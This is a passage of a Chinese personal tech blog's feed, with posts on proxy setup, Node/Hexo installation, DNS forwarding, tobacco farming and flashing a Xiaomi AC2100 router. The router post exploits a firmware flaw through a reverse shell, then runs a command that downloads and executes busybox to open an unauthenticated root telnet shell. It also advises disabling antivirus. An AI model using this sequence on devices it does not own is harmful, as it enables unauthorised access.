&lt;p&gt;  搜了一圈发现imgchr就是用chevereto搭建的，chev</summary>
      
    
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/tags/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
    <category term="NAS" scheme="https://coder.lufer.cc/tags/NAS/"/>
    
  </entry>
  
  <entry>
    <title>Linux下安装V2rayA以使用Trojan代理</title>
    <link href="https://coder.lufer.cc/Linux/Linux%E4%B8%8B%E5%AE%89%E8%A3%85V2rayA%E4%BB%A5%E4%BD%BF%E7%94%A8Trojan%E4%BB%A3%E7%90%86/"/>
    <id>https://coder.lufer.cc/Linux/Linux%E4%B8%8B%E5%AE%89%E8%A3%85V2rayA%E4%BB%A5%E4%BD%BF%E7%94%A8Trojan%E4%BB%A3%E7%90%86/</id>
    <published>2021-03-03T03:30:55.000Z</published>
    <updated>2021-04-06T02:18:27.062Z</updated>
    
    <content type="html"><![CDATA[<p>  最近推行国产化，在用UOS，其前身是Deepin，但是日常访问github时好时坏，所以还得折腾一下代理。</p><h1 id="v2raya"><a class="markdownIt-Anchor" href="#v2raya"></a> V2rayA</h1><p>  <code>https://github.com/v2rayA/v2rayA</code></p><p>  v2rayA 是一个支持全局透明代理的 V2Ray Linux 客户端，同时兼容SS、SSR、Trojan、PingTunnel协议。<br />  v2rayA 致力于提供最简单的操作，满足绝大部分需求。<br />  得益于Web客户端的优势，你不仅可以将其用于本地计算机，还可以轻松地将它部署在路由器或NAS上。</p><p>  v2rayA提供了三种使用方法：</p><ul><li>软件源安装</li><li>docker</li><li>二进制文件、安装包</li></ul><p>  我尝试了第一种，但是在我添加apt库的时候报错了，网上也没搜到解决方案。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@uos-PC:/tmp/v2raya<span class="comment"># sudo add-apt-repository &#x27;deb http://apt.v2raya.mzz.pub/ v2raya main&#x27;</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/usr/bin/add-apt-repository&quot;</span>, line 95, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    sp = SoftwareProperties(options=options)</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3/dist-packages/softwareproperties/SoftwareProperties.py&quot;</span>, line 109, <span class="keyword">in</span> __init__</span><br><span class="line">    self.reload_sourceslist()</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3/dist-packages/softwareproperties/SoftwareProperties.py&quot;</span>, line 599, <span class="keyword">in</span> reload_sourceslist</span><br><span class="line">    self.distro.get_sources(self.sourceslist)    </span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3/dist-packages/aptsources/distro.py&quot;</span>, line 93, <span class="keyword">in</span> get_sources</span><br><span class="line">    (self.id, self.codename))</span><br><span class="line">aptsources.distro.NoDistroTemplateException: Error: could not find a distribution template <span class="keyword">for</span> Uos/eagle</span><br></pre></td></tr></table></figure><p>  所以我干脆直接就用第二种方法装了。</p><h2 id="安装docker"><a class="markdownIt-Anchor" href="#安装docker"></a> 安装Docker</h2><p>  系统里面不带Docker，所以先装下Docker,顺便设置一下开机自动启动。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y docker.io</span><br><span class="line">systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure><h2 id="安装v2raya"><a class="markdownIt-Anchor" href="#安装v2raya"></a> 安装V2rayA</h2><p>  直接运行下面的命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">-p 2017:2017 \</span><br><span class="line">-p 20170-20172:20170-20172 \</span><br><span class="line">--restart=always \</span><br><span class="line">--name v2raya \</span><br><span class="line">-v /etc/v2raya:/etc/v2raya \</span><br><span class="line">mzz2017/v2raya</span><br></pre></td></tr></table></figure><p>  装好之后直接访问<code>http://localhost:2017/</code>就可以了。</p><p>  进去设置一下服务器地址，启用代理。</p><h1 id="proxychains"><a class="markdownIt-Anchor" href="#proxychains"></a> ProxyChains</h1><p>  由于很多程序和服务的下载都需要通过 npm, gem, nvm, git等命令进行，而在国内下载速度较差，所以还得为终端的命令启用代理，这里我采用了ProxyChains。</p><p>  <code>https://github.com/haad/proxychains/</code></p><h2 id="安装配置"><a class="markdownIt-Anchor" href="#安装配置"></a> 安装配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install proxychains</span><br><span class="line">sudo vi /etc/proxychains.conf</span><br></pre></td></tr></table></figure><p>  然后在最后的ProxyList里加入本地的代理设置，例如V2rayA的默认端口是20170。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socks5 127.0.0.1 20170</span><br></pre></td></tr></table></figure><p>  然后可以测试一下代理是否成功。<br />  终端运行<code>curl -4 ip.sb</code>，将显示自己的IP。<br />  终端运行<code>proxychains curl -4 ip.sb</code>，将显示代理服务器的IP。<br />  后续使用的命令行需要代理时，只需要在前面加上<code>proxychains</code>即可。如<code>proxychains npm install</code>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  最近推行国产化，在用UOS，其前身是Deepin，但是日常访问github时好时坏，所以还得折腾一下代理。&lt;/p&gt;
&lt;h1 id=&quot;v2raya&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#v2raya&quot;&gt;&lt;/a&gt; V2rayA&lt;/h1&gt;
</summary>
      
    
    
    
    <category term="Linux" scheme="https://coder.lufer.cc/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://coder.lufer.cc/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux安装Nodejs和Hexo</title>
    <link href="https://coder.lufer.cc/Linux/Linux%E5%AE%89%E8%A3%85Nodejs%E5%92%8CHexo/"/>
    <id>https://coder.lufer.cc/Linux/Linux%E5%AE%89%E8%A3%85Nodejs%E5%92%8CHexo/</id>
    <published>2021-03-02T02:54:13.000Z</published>
    <updated>2021-04-06T02:18:25.507Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装nodejs"><a class="markdownIt-Anchor" href="#安装nodejs"></a> 安装NodeJS</h1><h2 id="下载压缩包"><a class="markdownIt-Anchor" href="#下载压缩包"></a> 下载压缩包</h2><p>  去官网直接下载对应的压缩包。</p><p>  <code>https://nodejs.org/en/</code></p><p><img src="https://www.853tv.cn/imgs/2021/03/0258f4818f17e9e9.png" alt="官网下载压缩包" /></p><h2 id="解压缩"><a class="markdownIt-Anchor" href="#解压缩"></a> 解压缩</h2><p>  下载之后，解压缩，改一下目录名。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -i</span><br><span class="line">tar xf node-v14.16.0-linux-arm64.tar.xz -C /usr/<span class="built_in">local</span>/</span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/</span><br><span class="line">mv node-v14.16.0-linux-arm64/ nodejs</span><br></pre></td></tr></table></figure><h3 id="建立软连接"><a class="markdownIt-Anchor" href="#建立软连接"></a> 建立软连接</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ln -s /usr/<span class="built_in">local</span>/nodejs/bin/node /usr/<span class="built_in">local</span>/bin/</span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/nodejs/bin/npm /usr/<span class="built_in">local</span>/bin/</span><br></pre></td></tr></table></figure><h1 id="安装hexo"><a class="markdownIt-Anchor" href="#安装hexo"></a> 安装Hexo</h1><h2 id="npm安装hexo"><a class="markdownIt-Anchor" href="#npm安装hexo"></a> npm安装Hexo</h2><p>  先换源，再安装，以免装的太慢。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org/</span><br><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><h2 id="建立软连接-2"><a class="markdownIt-Anchor" href="#建立软连接-2"></a> 建立软连接</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ln -s /usr/<span class="built_in">local</span>/nodejs/bin/hexo /usr/<span class="built_in">local</span>/bin/</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;安装nodejs&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#安装nodejs&quot;&gt;&lt;/a&gt; 安装NodeJS&lt;/h1&gt;
&lt;h2 id=&quot;下载压缩包&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#下载压缩包&quot;</summary>
      
    
    
    
    <category term="Linux" scheme="https://coder.lufer.cc/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://coder.lufer.cc/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>小米AC2100路由器刷入Padavan固件</title>
    <link href="https://coder.lufer.cc/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/%E5%B0%8F%E7%B1%B3AC2100%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%85%A5Padavan%E5%9B%BA%E4%BB%B6/"/>
    <id>https://coder.lufer.cc/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/%E5%B0%8F%E7%B1%B3AC2100%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%85%A5Padavan%E5%9B%BA%E4%BB%B6/</id>
    <published>2021-02-14T04:37:37.000Z</published>
    <updated>2021-12-17T03:59:35.254Z</updated>
    
    <content type="html"><![CDATA[<p>  注：小米AC2100，红米AC2100皆可使用。<br />  注：开始前请记好宽带拨号账号密码。</p><h1 id="起因"><a class="markdownIt-Anchor" href="#起因"></a> 起因</h1><p>  最近发现只要一打开迅雷下载，即使在下载速度只有几K的情况下，路由器仍然会断网，有线Wifi全挂掉。<br />  看别人说是因为CPU跑满了，路由器宕机了。<br />  遂决定刷一下固件，选择了Hihoy的Padavan固件。</p><h1 id="系统环境设置"><a class="markdownIt-Anchor" href="#系统环境设置"></a> 系统环境设置</h1><h2 id="1-开启telnet"><a class="markdownIt-Anchor" href="#1-开启telnet"></a> 1. 开启Telnet</h2><p>  <code>控制面板-程序-启用或关闭Windows功能</code>，启用<code>Telnet客户端</code>。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/ysxi7j.png" alt="启用Telnet" /></p><h2 id="2-关闭防火墙和杀毒软件"><a class="markdownIt-Anchor" href="#2-关闭防火墙和杀毒软件"></a> 2. 关闭防火墙和杀毒软件</h2><p>  关闭WindowsDefender防火墙和杀毒软件（如果有）。</p><h2 id="3-禁用其他网卡"><a class="markdownIt-Anchor" href="#3-禁用其他网卡"></a> 3. 禁用其他网卡</h2><p>  只留下连接路由器的网卡接口。</p><h1 id="准备软件"><a class="markdownIt-Anchor" href="#准备软件"></a> 准备软件</h1><p>  因为刷机过程就断网了，所以这些软件都要提前下好。</p><h2 id="1-下载路由器刷机工具"><a class="markdownIt-Anchor" href="#1-下载路由器刷机工具"></a> 1. 下载路由器刷机工具</h2><p>  链接：<a href="https://pan.baidu.com/s/1cOQdsMNr4xqi3h8fqqMfbQ">https://pan.baidu.com/s/1cOQdsMNr4xqi3h8fqqMfbQ</a> 提取码：8kw8。<br />  下载完成后解压，并安装文件夹下的<code>WinPcap_4_1_3.exe</code>。</p><h2 id="2-安装winscp"><a class="markdownIt-Anchor" href="#2-安装winscp"></a> 2. 安装Winscp</h2><p>  <a href="https://winscp.net/eng/download.php">https://winscp.net/eng/download.php</a></p><h2 id="3-安装putty"><a class="markdownIt-Anchor" href="#3-安装putty"></a> 3. 安装Putty</h2><p>  <a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html</a></p><h2 id="4-路由器降级"><a class="markdownIt-Anchor" href="#4-路由器降级"></a> 4. 路由器降级</h2><p>  由于路由器新版本固件封掉了刷机漏洞，直接刷是刷不进去的，会向下面这样抛异常（图片来自网络，我自己忘了截图了）。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/ysxgv8.png" alt="高版本固件异常图" /></p><p>  所以要先刷固件回到低版本，下载链接放在下面。<br />  链接：<a href="https://pan.baidu.com/s/16AxC6AGIiIOBq9b96xAS-w">https://pan.baidu.com/s/16AxC6AGIiIOBq9b96xAS-w</a> 提取码：eb84。</p><h2 id="5-最新的padavan刷机包"><a class="markdownIt-Anchor" href="#5-最新的padavan刷机包"></a> 5. 最新的Padavan刷机包</h2><p>  <a href="https://opt.cn2qq.com/padavan/">https://opt.cn2qq.com/padavan/</a></p><p>  可以在里面搜索2100。小米路由器下载<code>R2100_3.4.3.9-099.trx</code>，红米路由器下载<code>RM2100_3.4.3.9-099.trx</code>。</p><h1 id="开始刷入"><a class="markdownIt-Anchor" href="#开始刷入"></a> 开始刷入</h1><h2 id="1-路由器降级"><a class="markdownIt-Anchor" href="#1-路由器降级"></a> 1. 路由器降级</h2><p>  首先到路由器设置页面，在手动升级里面选择之前下载的低版本刷机包，随后会自动刷入并重启。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/ysxbvT.png" alt="手动降级固件" /></p><h2 id="2-修改dhcp"><a class="markdownIt-Anchor" href="#2-修改dhcp"></a> 2. 修改DHCP</h2><p>  在成功降级后，进入路由器设置页面，将路由器的地址设置为<code>192.168.31.1</code>。</p><h2 id="3-插线"><a class="markdownIt-Anchor" href="#3-插线"></a> 3. 插线</h2><p>  将路由器的网线都拔掉，然后将WAN口连接到LAN1口（如果后面发现有问题，可以插到LAN3试一下），中间的LAN口连接电脑。</p><h2 id="4-设置电脑ip"><a class="markdownIt-Anchor" href="#4-设置电脑ip"></a> 4. 设置电脑IP</h2><p>  将电脑的IP手动设置为<code>192.168.31.177</code>,子网掩码<code>255.255.255.0</code>，网关<code>192.168.31.1</code>。</p><h2 id="5-设置拨号"><a class="markdownIt-Anchor" href="#5-设置拨号"></a> 5. 设置拨号</h2><p>  打开路由器的上网设置页面，上网方式设置为<code>PPPOE</code>，账号和密码都设置为123。</p><h2 id="6-刷入breed"><a class="markdownIt-Anchor" href="#6-刷入breed"></a> 6. 刷入Breed</h2><p>  双击打开<code>一键开启telnet.bat</code>（不用管理员运行）。<br /><img src="https://pic.lufer.cc/images/2021/03/15/yszaR0.png" alt="解锁工具" /></p><p>  按回车，会打开测试PPPOE数据包的窗口</p><p><img src="https://pic.lufer.cc/images/2021/03/15/yszdzV.png" alt="成功监测到数据包" /></p><p>  如果这里抛异常，路由器要降级固件。<br />  如果没有异常，返回第一个窗口按y，注意要输入小写。</p><p>  随后会打开反弹shell窗口，等到提示<code>connect to [192.168.31.177] from (UNKNOWN) [192.168.31.1] 31290</code> 就代表反弹成功。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/yszRRx.png" alt="反弹成功" /></p><p>  这时打开<code>开启telnet命令.txt</code>,复制其中的内容，也就是下面这行</p><blockquote><p>cd /tmp&amp;&amp;wget <a href="http://192.168.31.177:8081/busybox&amp;&amp;chmod">http://192.168.31.177:8081/busybox&amp;&amp;chmod</a> a+x ./busybox&amp;&amp;./busybox telnetd -l /bin/sh</p></blockquote><p>  粘贴到窗口中，按ctrl+V是无效的，点右键即可粘贴，如果不行就在标题栏点右键粘贴，随后回车，出现如下图提示即代表Telnet解锁成功。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/yySSeg.png" alt="解锁Telnet" /></p><p>  随后打开命令提示符，粘贴如下代码运行，请逐个粘贴运行。</p><blockquote><p>telnet 192.168.31.1<br />wget <a href="http://192.168.31.177:8081/r3g.bin&amp;&amp;nvram">http://192.168.31.177:8081/r3g.bin&amp;&amp;nvram</a> set uart_en=1&amp;&amp;nvram set bootdelay=5&amp;&amp;nvram set flag_try_sys1_failed=1&amp;&amp;nvram commit<br />mtd -r write r3g.bin kernel1</p></blockquote><p>  如果出现如下图的提示，则代表Breed刷入成功了，此时路由器会自动重启。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/yySmmF.png" alt="Breed刷入成功" /></p><h2 id="7-刷入padavan"><a class="markdownIt-Anchor" href="#7-刷入padavan"></a> 7. 刷入Padavan</h2><p>  在路由器重启成功后，将电脑的IP地址改为自动获取，并拔掉路由器的电源，按住Reset按键并插入电源，10s后松开按钮即可。</p><p>  注意，这里要检查电脑获取到的IP地址是否为<code>192.168.1.X</code>，如果是<code>169</code>开头的IP地址，代表自动获取失败，需要将IP地址手动设置为<code>192.168.1.X</code>网段，网关设置为<code>192.168.1.1</code>。</p><p>  随后打开Winscp，连接192.168.1.1，协议是SCP，账号：root 或 admin 密码：admin。</p><p>  然后上最上面的三点，切到主目录后，选择tmp文件夹，放进之前下载的最新固件<code>R2100_3.4.3.9-099.trx</code>。</p><p>  完成后关闭Winscp，再打开Putty，输入192.168.1.1，账号：root 或 admin 密码：admin。</p><p>  然后在出现的OP窗口里执行下边这句，注意要改成对应的文件名：</p><blockquote><p>mtd -r write /tmp/R2100_3.4.3.9-099.trx kernel</p></blockquote><p>  此时等待刷入padavan固件，完成后路由器会重启。</p><h1 id="恢复现场"><a class="markdownIt-Anchor" href="#恢复现场"></a> 恢复现场</h1><p>  将网线插回正常状态，随后将电脑设置为自动获取IP，打开192.168.2.1 账号：root 或 admin 密码：admin 进入路由设置页面。</p><p>  至此完成了Padavan的刷入，在<code>网络地图</code>里面设置好宽带的拨号，然后设置好wifi名称和密码即可。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  注：小米AC2100，红米AC2100皆可使用。&lt;br /&gt;
  注：开始前请记好宽带拨号账号密码。&lt;/p&gt;
&lt;h1 id=&quot;起因&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#起因&quot;&gt;&lt;/a&gt; 起因&lt;/h1&gt;
&lt;p&gt;  最近发现只要一打开迅</summary>
      
    
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/tags/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
    <category term="路由器" scheme="https://coder.lufer.cc/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>邮箱MX与主域名CNAME解析冲突的解决方案</title>
    <link href="https://coder.lufer.cc/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/%E9%82%AE%E7%AE%B1MX%E4%B8%8E%E4%B8%BB%E5%9F%9F%E5%90%8DCNAME%E8%A7%A3%E6%9E%90%E5%86%B2%E7%AA%81%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>https://coder.lufer.cc/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/%E9%82%AE%E7%AE%B1MX%E4%B8%8E%E4%B8%BB%E5%9F%9F%E5%90%8DCNAME%E8%A7%A3%E6%9E%90%E5%86%B2%E7%AA%81%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</id>
    <published>2021-02-01T09:43:43.000Z</published>
    <updated>2021-12-17T03:59:35.254Z</updated>
    
    <content type="html"><![CDATA[<h1 id="起因"><a class="markdownIt-Anchor" href="#起因"></a> 起因</h1><p>  因为我启用了@lufer.cc的域名邮箱，所以DNS解析记录要添加一个值为@的MX记录，但这样就会与我想解析的@记录产生冲突，导致<code>lufer.cc</code>域名无法正常访问。</p><h1 id="解决"><a class="markdownIt-Anchor" href="#解决"></a> 解决</h1><h2 id="解决方案"><a class="markdownIt-Anchor" href="#解决方案"></a> 解决方案</h2><p>  解决方案有两种，一种是把@记录进行301转发，另一种是使用一些DNS服务商提供的解决方案。我采用了第一种，第二种对不同的DNS服务商而言不太一样，例如Cloudflare是CNAME Flattening，对于cloudxns是link记录。</p><h2 id="dns提供商选择"><a class="markdownIt-Anchor" href="#dns提供商选择"></a> DNS提供商选择</h2><p>  这里首先有一个前提，就是国内的DNS解析服务商在网站未备案的时候是不提供301转发服务的，我试过了阿里云，DNSpod，H3DNS均不行。而我在github的CNAME写的是<code>coder.lufer.cc</code>，我需要把www的解析也转发到这个域名，所以实际上我<code>www.lufer.cc</code>也是无法访问的。</p><p>  所以我最后选择了Cloudflare。</p><h2 id="实施使用cloudflare"><a class="markdownIt-Anchor" href="#实施使用cloudflare"></a> 实施（使用Cloudflare）</h2><h3 id="注册登录"><a class="markdownIt-Anchor" href="#注册登录"></a> 注册登录</h3><p>  不多说了，注册选免费方案，添加自己的域名。</p><h3 id="转移dns"><a class="markdownIt-Anchor" href="#转移dns"></a> 转移DNS</h3><p>  因为我域名在阿里云，要在阿里云把DNS解析转移到Cloudflare。</p><p>  先在阿里云的DNS修改处改成Cloudflare提供的DNS</p><p><img src="https://pic.lufer.cc/images/2021/03/15/ym2irV.png" alt="Cloudflare的DNS" /></p><p><img src="https://pic.lufer.cc/images/2021/03/15/ymgKHS.png" alt="把阿里云修改成对应的DNS" /></p><p>  DNS解析服务器修改之后可能需要一段时间才能同步，但不影响进行后续步骤。</p><h3 id="添加解析"><a class="markdownIt-Anchor" href="#添加解析"></a> 添加解析</h3><p>  在Cloudflare按照之前的需求添加DNS解析。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/ymRKYQ.png" alt="DNS解析记录" /></p><h3 id="设置301转发"><a class="markdownIt-Anchor" href="#设置301转发"></a> 设置301转发</h3><p>  在<code>页面规则</code>下面添加两条301转发，如下图所示。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/ymRtTU.png" alt="添加页面转发" /></p><p>  页面规则的具体添加方式如下图所示，注意上下两个域名最后分别要添加<code>/*</code>和<code>$1</code>。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/ymfMMn.png" alt="页面规则编辑" /></p><p>  在设置转发之后，还要为设置了转发的域名添加A记录，才能进行解析，地址可以随便写,因为实际上进行了转发，不会解析到该IP。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/ymhhp4.png" alt="域名对应A记录" /></p><h3 id="设置ssl"><a class="markdownIt-Anchor" href="#设置ssl"></a> 设置SSL</h3><p>  在转移到Cloudflare之后，我发现我连<code>coder.lufer.cc</code>都无法访问了，具体出错信息是<code>“网站将您重定向次数过多”</code>。</p><p>  解决方法是在<code>SSL/TLS</code>的菜单页中，默认的加密方式为<code>完全</code>，我们将它更改为<code>完全（严格）</code>即可。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/ym4wE6.png" alt="SSL/TLS设置" /></p><h1 id="结语"><a class="markdownIt-Anchor" href="#结语"></a> 结语</h1><p>  至此完成了域名解析的转移和301转发的设置，域名均可正常访问，邮箱也可正常收发邮件。<br />  本来想把整个域名都转走的，奈何阿里云的域名太便宜了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;起因&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#起因&quot;&gt;&lt;/a&gt; 起因&lt;/h1&gt;
&lt;p&gt;  因为我启用了@lufer.cc的域名邮箱，所以DNS解析记录要添加一个值为@的MX记录，但这样就会与我想解析的@记录产生冲突，导致&lt;code</summary>
      
    
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/tags/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
    <category term="DNS" scheme="https://coder.lufer.cc/tags/DNS/"/>
    
  </entry>
  
  <entry>
    <title>烟叶生产与初加工</title>
    <link href="https://coder.lufer.cc/%E5%85%B6%E4%BB%96%E7%9F%A5%E8%AF%86/%E7%83%9F%E5%8F%B6%E7%94%9F%E4%BA%A7%E4%B8%8E%E5%88%9D%E5%8A%A0%E5%B7%A5/"/>
    <id>https://coder.lufer.cc/%E5%85%B6%E4%BB%96%E7%9F%A5%E8%AF%86/%E7%83%9F%E5%8F%B6%E7%94%9F%E4%BA%A7%E4%B8%8E%E5%88%9D%E5%8A%A0%E5%B7%A5/</id>
    <published>2020-12-30T03:13:21.000Z</published>
    <updated>2021-12-17T03:59:35.254Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-烟草的类型"><a class="markdownIt-Anchor" href="#一-烟草的类型"></a> 一、烟草的类型</h1><p>  烟草属于茄科烟属，主要可以分为：</p><ul><li>普通烟草（红花烟草）<ul><li>烤烟</li><li>白肋烟</li><li>香料烟</li></ul></li><li>黄花烟草</li><li>碧冬烟草</li></ul><p>  <code>烟草调制</code>：使大田收获的烟叶处在一定条件下，通过适当的物质转化、脱水、干燥，使其有利于工业制品需求的外观质量和内在质量充分表现出来的过程。<br />  我国按照烟草调制方法，兼顾烟草品质特点进行烟草类型的划分。主要可以分为<code>晾烟</code>、<code>晒烟</code>、<code>烤烟</code>、<code>熏烟</code>、<code>野生烟</code>、<code>黄花烟</code>、<code>香料烟</code>、<code>白肋烟</code>。</p><h2 id="1-烤烟"><a class="markdownIt-Anchor" href="#1-烤烟"></a> 1. 烤烟</h2><p>  烤烟，也称火管烤烟，源于弗吉尼亚，因用火管<code>在房内烤干烟叶</code>而得名。植株较大，叶片分布较疏而均匀，一般株高120~150cm，单株留叶20~30片。<br />  叶片厚薄适中，中部叶的质量最佳。<br />  叶片自上而下成熟，分次采收，烤后多呈桔黄色或柠檬黄色。<br />  糖含量较高，蛋白质含量较低，烟碱含量中等。</p><h2 id="2-晒烟"><a class="markdownIt-Anchor" href="#2-晒烟"></a> 2. 晒烟</h2><p>  <code>利用阳光调制而成</code>，主要有<code>晒红烟</code>和<code>晒黄烟</code>，其中晒黄烟与烤烟相近。<br />  晒红烟的叶片较少，叶肉较厚。可以分次采收或者一次采收。<br />  晒后呈深褐色或紫褐色，上部叶片质量最佳。<br />  糖含量较低，蛋白质和烟碱含量较高，烟味浓，劲头大。</p><h2 id="3-晾烟"><a class="markdownIt-Anchor" href="#3-晾烟"></a> 3. 晾烟</h2><p>  主要分为<code>浅色晾烟</code>和<code>深色晾烟</code>，是<code>在阴凉通风场所晾制而成</code>。</p><h2 id="4-白肋烟"><a class="markdownIt-Anchor" href="#4-白肋烟"></a> 4. 白肋烟</h2><p>  白肋烟是马里兰型阔叶烟的一个突变种，是英文Burley音译而来。<br />  茎和主脉呈乳白色，叶片呈黄绿色，叶绿素含量为其他绿色烟的1/3。<br />  要求中下部叶片大而薄，适宜较肥沃的土壤，对氮素的要求较高。<br />  成长快，成熟集中，可以分次采收或整株采收。<br />  烟碱和总氮含量比烤烟高，含糖量较低。<br />  是混合型卷烟的主要原料之一。<br />  主要生产国家是美国，其次是马拉维、巴西、意大利和西班牙。国内主要产区有湖北、重庆、四川和云南。</p><h2 id="5-香料烟"><a class="markdownIt-Anchor" href="#5-香料烟"></a> 5. 香料烟</h2><p>  又称为土耳其烟或东方型烟。<br />  株型纤瘦，叶片多而小，株高80~100cm，叶长10~20cm，叶型为宽卵圆形或心脏形。<br />  有芳香香气，是混合型卷烟的主要调香原料。<br />  顶部叶片最好，烟碱含量较低。</p><h2 id="6-黄花烟"><a class="markdownIt-Anchor" href="#6-黄花烟"></a> 6. 黄花烟</h2><p>  黄花烟比较耐寒，多种植在高纬度和无霜期短的地区。<br />  总烟碱、总氮及蛋白质含量均较高，糖分含量较低，烟味浓烈。</p><h2 id="7-野生烟"><a class="markdownIt-Anchor" href="#7-野生烟"></a> 7. 野生烟</h2><p>  野生烟是指烟属中除了普通烟草和黄花烟草这两个栽培种以外的所有烟草野生种，这些野生种形态各异，用途不一，无商业价值，未被大面积种植。</p><h2 id="8-熏烟"><a class="markdownIt-Anchor" href="#8-熏烟"></a> 8. 熏烟</h2><p>  又称明火烤烟，是美洲古老的熏制方法调制的烟叶。其方法是直接在调制房内生活，烟叶挂在烤房内直接烘烤。<br />含氮物质含量较高，尤其是烟碱含量高，糖含量低。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/rLer5V.png" alt="不同类型烟叶主要化学成分比较(%)" /></p><h1 id="二-烟叶生产的原理与技术"><a class="markdownIt-Anchor" href="#二-烟叶生产的原理与技术"></a> 二、烟叶生产的原理与技术</h1><h2 id="烟草育苗"><a class="markdownIt-Anchor" href="#烟草育苗"></a> 烟草育苗</h2><h3 id="1-育苗移栽"><a class="markdownIt-Anchor" href="#1-育苗移栽"></a> 1. 育苗移栽</h3><p>  育苗是烟草生产的重要环节，是优质烟叶生产的基础。我国烟草广泛采用的是育苗移栽的生产方式。<br />  育苗移栽的好处主要有以下几点：</p><ul><li>能缩短大田栽培时间，经济有效的利用土地，提高复种指数。</li><li>可以人为的提供比较适宜的温、光、水、养分等条件，满足种子萌发和幼苗生长的要求。</li><li>通过间苗、锻苗、除杂去劣和病虫害防治等措施，可以生产出整齐、健壮、足量的烟苗。</li><li>在无霜期短的烟区，可以克服霜期对烟草生产的限制。</li></ul><h3 id="2-壮苗"><a class="markdownIt-Anchor" href="#2-壮苗"></a> 2. 壮苗</h3><p>  壮苗应具有抗逆性好，移栽后发根力强，方便移栽，大田生长发育协调，有一定的增产增质效果等基本特征。</p><h3 id="3-漂浮育苗技术"><a class="markdownIt-Anchor" href="#3-漂浮育苗技术"></a> 3. 漂浮育苗技术</h3><p>  漂浮育苗于20世纪80年代在美国、日本、加拿大等国家首先出现，是20世纪90年代开始推广起来的先进育苗技术，目前已成为<code>我国烟草育苗的主要方式</code>。</p><h2 id="烟田选地与耕整"><a class="markdownIt-Anchor" href="#烟田选地与耕整"></a> 烟田选地与耕整</h2><h3 id="1-土壤"><a class="markdownIt-Anchor" href="#1-土壤"></a> 1. 土壤</h3><p>  